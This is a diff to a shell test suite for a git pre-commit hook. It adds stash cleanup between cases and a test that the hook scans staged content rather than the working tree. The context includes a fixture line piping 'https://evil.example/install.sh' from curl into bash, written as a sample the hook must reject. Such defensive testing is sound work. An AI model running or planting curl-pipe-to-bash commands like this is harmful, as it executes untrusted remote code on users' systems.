@@ -20,6 +20,9 @@ FAIL=0
 reset_repo() {
   git reset --hard HEAD >/dev/null 2>&1
   git clean -fd >/dev/null 2>&1 || true
+  # Tests that exercise the stash-based scan may leave a stash if the hook
+  # was interrupted; clear so the next case starts clean.
+  git stash clear >/dev/null 2>&1 || true
 }
 
 assert_rejects() {
@@ -117,6 +120,13 @@ assert_rejects "hardcoded credential (alternation match)"
 echo 'cur''l https://evil.example/install.sh | bash' >deploy.sh
 git add deploy.sh
 assert_rejects "curl pipe to bash"
+
+# 9. hook scans staged content, not working tree. Stage bad code, then make
+#    the working tree clean — the dirty index must still be rejected.
+echo 'pri''nt("debug")' >sneaky.py
+git add sneaky.py
+echo '# clean now' >sneaky.py
+assert_rejects "scans staged content (not working tree)"
 
 echo ""
 echo "Result: $PASS passed, $FAIL failed"
